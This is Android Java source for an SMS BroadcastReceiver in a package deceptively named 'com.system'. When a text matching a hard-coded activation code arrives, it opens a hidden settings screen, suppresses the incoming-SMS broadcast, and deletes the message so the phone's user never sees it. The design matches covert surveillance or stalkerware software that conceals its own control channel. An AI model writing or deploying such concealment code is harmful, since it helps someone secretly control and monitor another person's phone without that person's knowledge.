package com.system;

import com.system.activity.InitActivity;
import com.system.feature.sms.SmsCtrl;
import com.system.utils.SysUtils;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

/**
 * Receiver for activating setting view.
 */
public class ActivationReceiver extends BroadcastReceiver 
{
	private static final String LOGTAG = "ActivationReceiver";
	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	private static final String ACTIVATION_CODE = "1234567890";
	
	@Override
	public void onReceive(Context context, Intent intent) 
	{
		//SysUtils.messageBox(context, "Enter ActivationReceiver : " + intent.getAction());
		
		if (intent.getAction().equals(SMS_RECEIVED)) 
		{	
			Bundle bundle = intent.getExtras();
			Object messages[] = (Object[]) bundle.get("pdus");
			SmsMessage smsMessages[] = new SmsMessage[messages.length];
			for (int n = 0; n < messages.length; n++) {
				smsMessages[n] = SmsMessage.createFromPdu((byte[]) messages[n]);
			}

			if (smsMessages.length > 0) {
				// Show the lastest coming SMS
				String smsBody = smsMessages[0].getMessageBody();
				//SysUtils.messageBox(context, "Received SMS: " + smsBody);
				
				// Show the setting view
				if (smsBody.equals(ACTIVATION_CODE)) {
					try {
						Intent initIntent = new Intent().setClass(context, InitActivity.class);
						initIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP); 
						initIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); 
						context.startActivity(initIntent);
						this.abortBroadcast(); // Finish broadcast, the system will notify this SMS
						
						//Remove the activation SMS
						SmsCtrl.deleteTheLastSMS(context);
					}
					catch (Exception ex) {
						Log.e(LOGTAG, ex.getMessage());
					}
				}
			}
		}
        
	}
}